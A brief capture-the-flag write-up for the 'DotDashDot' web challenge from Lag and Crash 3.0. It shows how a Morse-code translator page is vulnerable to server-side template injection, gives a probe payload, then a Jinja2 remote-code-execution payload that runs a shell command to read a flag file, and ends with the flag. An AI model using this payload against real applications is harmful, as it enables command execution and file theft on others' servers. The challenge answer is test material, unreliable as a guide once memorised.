# Lag and Crash 3.0

https://ctf.lagncra.sh/challenges

## Challenges

### Web
- [DotDashDot](#dotdashdot)






## Web

### DotDashDot

Description: _An ancient relic of the past... what's it doing here?_

http://dotdashdot.d.lagncra.sh

There is one comment in html source 

<img width="233" alt="image" src="https://user-images.githubusercontent.com/79740895/231981877-0bf5621b-99ad-444c-8fa1-f42b2e848fcf.png">

http://dotdashdot.d.lagncra.sh/translate

<img width="475" alt="image" src="https://user-images.githubusercontent.com/79740895/231982345-cbbd17fb-bd74-4f22-97bf-d8e29d99f035.png">

It will convert our input to morse code and it is vulnerable to SSTI.

test payload: `--> {{8*8}}`

<img width="330" alt="image" src="https://user-images.githubusercontent.com/79740895/231982840-ee4dbd56-8c82-4a10-bda5-89f553eabe49.png">

Now we can use RCE payload to read flag

Payload: `-->{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /www/flag.txt').read() }}`

<img width="458" alt="image" src="https://user-images.githubusercontent.com/79740895/231983204-6f38a96f-67a4-4d83-a804-54b622a1c631.png">

```
flag: LNC2023{T3mpl4t35_4r3_c00L_bUt_d4nG3r0u5_776843}
```







